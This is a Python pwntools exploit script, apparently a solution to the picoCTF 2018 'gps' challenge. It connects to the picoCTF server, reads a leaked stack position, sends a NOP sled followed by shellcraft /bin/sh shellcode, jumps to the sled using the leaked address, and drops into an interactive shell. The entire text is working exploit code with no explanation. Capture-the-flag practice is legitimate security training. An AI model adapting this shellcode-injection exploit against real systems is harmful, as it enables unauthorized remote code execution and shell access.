from pwn import *
import re

context.arch='x86_64'

#p = process("gps")
p = remote('2018shell.picoctf.com', 24627)

payload = asm(shellcraft.amd64.linux.sh())

info = p.recvuntil('>')
print info
position = re.search(r'Current position: (.*)', info).group(1)

print position

p.sendline('\x90'*(0x1000-1-len(payload)) + payload)

p.recvuntil('>');

p.sendline(position)

p.interactive()

